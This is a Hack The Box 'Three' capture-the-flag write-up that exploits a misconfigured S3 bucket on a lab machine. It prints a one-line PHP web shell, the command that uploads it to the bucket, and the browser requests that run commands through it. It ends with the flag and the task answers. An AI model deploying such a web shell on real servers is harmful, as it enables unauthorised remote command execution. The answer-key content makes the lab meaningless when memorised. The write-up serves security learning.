# Hack The Box: Three Writeup — Very Easy

> **Difficulty:** Very Easy | **Tier:** Starting Point Tier 1 | **Tags:** AWS S3, Subdomain Enumeration, File Upload, Web Shell, Gobuster

Another day, another box! This one was different — I had no idea what Amazon S3 was at the start. Had to Google it, read the AWS documentation, install the CLI, and figure it out from scratch. That's the real learning 😄 Let's dive in 🚀

---

## What is Three?

Three is a Very Easy machine from Hack The Box Starting Point Tier 1. It teaches you about AWS S3 bucket misconfigurations, subdomain enumeration, and how an exposed S3 bucket can lead to remote code execution by uploading a web shell.

**Skills covered:**
- Network reconnaissance with Nmap
- Virtual host subdomain enumeration with Gobuster
- AWS CLI setup and S3 bucket interaction
- File upload to misconfigured S3 bucket
- Web shell execution to read the flag

---

## Setting Up

Connect to the HTB network using your OpenVPN config file:

```bash
sudo openvpn your-htb-vpn-file.ovpn
```

Spawn the Three machine. My target IP was `10.129.110.65`.

<!-- ADD: Target_IP.png here -->

---

## Step 1 — Ping the Target

Confirm the machine is reachable:

```bash
ping -c 4 10.129.110.65
```

<!-- ADD: ping_check.png here -->

All 4 packets returned with 0% packet loss. Target is alive. ✅

---

## Step 2 — Nmap Scan

Run a full service version scan:

```bash
nmap -sVC -T4 10.129.110.65
```

<!-- ADD: nmap_scan.png here -->

**Results:**

```
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu
80/tcp open  http    Apache httpd 2.4.29 (Ubuntu)
|_http-title: The Toppers
```

**2 TCP ports are open** (Task 1) — SSH on port 22 and HTTP on port 80.

---

## Step 3 — Web Enumeration

Visit `http://10.129.110.65` in the browser. It shows a band website called "The Toppers". Navigate to the **Contact** section.

<!-- ADD: web_page_contact.png here -->

The email shown is `mail@thetoppers.htb` — so the domain is **`thetoppers.htb`** (Task 2).

---

## Step 4 — Add Domain to /etc/hosts

Without a DNS server, we use the `/etc/hosts` file to resolve hostnames (Task 3). Open it with nano:

```bash
sudo nano /etc/hosts
```

Add this line:

```
10.129.110.65   thetoppers.htb
```

<!-- ADD: add_domain_to_etc_hosts.png here -->

---

## Step 5 — Subdomain Enumeration with Gobuster

Now use Gobuster in **vhost mode** to find hidden subdomains:

```bash
gobuster vhost --append-domain -u http://thetoppers.htb -w /usr/share/seclists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-small.txt
```

<!-- ADD: gobuster_input.png here -->

<!-- ADD: gobuster_output.png here -->

From the output, `s3.thetoppers.htb` returns a **Status: 404** with Size: 21 — different from all the 400 errors. This is our subdomain (Task 4).

Add it to `/etc/hosts` as well:

```bash
sudo nano /etc/hosts
```

Add:

```
10.129.110.65   s3.thetoppers.htb
```

<!-- ADD: add_sub_domain_to_hosts.png here -->

---

## Step 6 — Discover the S3 Service

Visit `http://s3.thetoppers.htb` in the browser:

<!-- ADD: sub_domain_web_page.png here -->

```json
{"status": "running"}
```

The service running on the subdomain is **Amazon S3** (Task 5).

---

## Step 7 — What is Amazon S3?

At this point I had no idea what S3 was. So I Googled it.

<!-- ADD: s3_output.png here -->

**Amazon S3 (Simple Storage Service)** is a cloud object storage service by AWS. It stores files in "buckets". The important thing here — if a bucket is **misconfigured**, anyone can list and upload files to it without authentication. This machine is running a **local fake S3 service** using a tool called LocalStack.

The command line utility used to interact with S3 is **`aws`** (the AWS CLI) (Task 6).

---

## Step 8 — Install AWS CLI

I followed the official AWS documentation to install the CLI:

<!-- ADD: aws_cli_installation_commands.png here -->

```bash
curl "https://awscli.amazonaws.com/awscli-exe-linux-x86_64.zip" -o "awscliv2.zip"
unzip awscliv2.zip
sudo ./aws/install
```

Verify installation:

```bash
aws --version
```

<!-- ADD: aws_version.png here -->

Also checked the help menu to understand available commands:

<!-- ADD: aws_help_menu.png here -->

---

## Step 9 — Configure AWS CLI

The command used to set up the AWS CLI is **`aws configure`** (Task 7).

Since this is a fake local S3, we can use dummy values:

```bash
aws configure
```

<!-- ADD: configure_aws_cli.png here -->

```
AWS Access Key ID: a
AWS Secret Access Key: a
Default region name: a
Default output format: a
```

---

## Step 10 — List S3 Buckets

The command to list all S3 buckets is **`s3 ls`** (Task 8):

```bash
aws s3 ls --endpoint-url http://s3.thetoppers.htb/
```

<!-- ADD: aws_bucket_view.png here -->

**Output:**

```
PRE images/
    .htaccess
    index.php
```

We can see the bucket `thetoppers.htb` contains the website files — including `index.php`. This means the server runs **PHP** (Task 9).

---

## Step 11 — Upload a Web Shell

Since we can write to this bucket, we can upload a PHP web shell. Create a file called `shell.php`:

```bash
echo '<?php system($_GET["cmd"]); ?>' > shell.php
```

Upload it to the S3 bucket:

```bash
aws s3 cp --endpoint-url http://s3.thetoppers.htb/ shell.php s3://thetoppers.htb/
```

<!-- ADD: php_file_upload.png here -->

---

## Step 12 — Execute the Web Shell

Now visit the shell in the browser:

```
http://thetoppers.htb/shell.php?cmd=ls
```

<!-- ADD: shell_working.png here -->

```
images index.php shell.php
```

The shell is working! Now find the flag:

```
http://thetoppers.htb/shell.php?cmd=ls+/var/www
```

<!-- ADD: flag_found.png here -->

```
flag.txt html
```

Read it:

```
http://thetoppers.htb/shell.php?cmd=cat+/var/www/flag.txt
```

<!-- ADD: flag.png here -->

---

## Flag

```
a980d99281a28d638ac68b9bf9453c2b
```

---

## Task Answers

**Task 1 — How many TCP ports are open?**
`2`

**Task 2 — What is the domain of the email address in the Contact section?**
`thetoppers.htb`

**Task 3 — Which Linux file resolves hostnames without a DNS server?**
`/etc/hosts`

**Task 4 — Which subdomain is discovered during enumeration?**
`s3.thetoppers.htb`

**Task 5 — Which service is running on the discovered subdomain?**
`Amazon S3`

**Task 6 — Which command line utility interacts with S3?**
`awscli`

**Task 7 — Which command sets up the AWS CLI?**
`aws configure`

**Task 8 — What command lists all S3 buckets?**
`s3 ls`

**Task 9 — What web scripting language does this server run?**
`PHP`

---

## What I Learned

Three taught me something completely new — I had never heard of Amazon S3 before this box. I had to step back, Google it, read the AWS documentation, install the CLI from scratch, and figure out how it works. That's the real hacking mindset — you won't always know the technology, but you learn it as you go.

The core vulnerability here is a **misconfigured S3 bucket** with public write access. In a real environment this would mean:

- **Make S3 buckets private** — never allow anonymous uploads
- **Don't serve user-uploaded files directly** as executable scripts
- **Use bucket policies** to restrict read/write to trusted identities only
- **Never expose internal storage services** to the public network

---

*Written by [Tharindu Pathmasiri](https://github.com/tharindu-L) — IT Undergraduate | Cybersecurity Enthusiast*
